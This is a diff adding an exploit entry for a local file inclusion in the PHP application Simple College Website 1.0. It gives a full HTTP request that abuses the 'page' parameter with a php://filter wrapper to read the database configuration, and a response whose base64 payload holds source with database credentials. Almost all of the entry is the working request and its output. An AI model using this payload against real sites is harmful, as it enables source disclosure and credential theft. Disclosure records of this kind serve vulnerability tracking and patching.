@@ -1,0 +1,48 @@
+# Exploit Title: Simple College Website 1.0 - 'page' Local File Inclusion
+# Date: 30-10-2020
+# Exploit Author: mosaaed
+# Vendor Homepage: https://www.sourcecodester.com/php/14548/simple-college-website-using-htmlphpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/simple-college-website.zip
+# Version: 1.0
+# Tested on: Parrot 5.5.17 + version: Apache/2.4.46 (Debian)
+# CVE ID : N/A
+
+# Local File Inclusion
+#parameter Vulnerable: page
+
+#Request
+
+GET /college_website/index.php?page=php://filter/convert.base64-encode/resource=admin/db_connect HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=7ls9j695lglc2eah5khecv2g66
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Cache-Control: max-age=0
+
+
+#Response 
+
+HTTP/1.1 200 OK
+
+Date: Sat, 31 Oct 2020 02:49:31 GMT
+Server: Apache/2.4.46 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 15674
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+ <main class="">
+
+        PD9waHAgDQoNCiRjb25uPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyb290JywncGFzc3dvcmQnLCdjb2xsZWdlX3dlYnNpdGVfZGInKW9yIGRpZSgiQ291bGQgbm90IGNvbm5lY3QgdG8gbXlzcWwiLm15c3FsaV9lcnJvcigkY29uKSk7DQo=       
+
+</main>
